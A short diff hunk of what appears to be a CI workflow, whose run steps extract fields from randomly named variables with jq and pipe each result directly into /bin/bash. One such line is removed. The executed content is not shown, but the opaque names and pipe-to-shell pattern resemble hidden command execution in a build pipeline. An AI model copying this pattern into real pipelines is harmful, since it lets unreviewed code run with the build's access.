@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$h25" | jq -r .borf92350 | /bin/bash
           echo $cmx2 | jq -r .rn99 | /bin/bash
           printf '%s' "$oca53493" | jq -r .qum99277 | /bin/bash
-          echo $jh38 | jq -r .z8 | /bin/bash
           printf '%s' "$btb53747" | jq -r .dnv1 | /bin/bash
 
       - name: Archive artifact
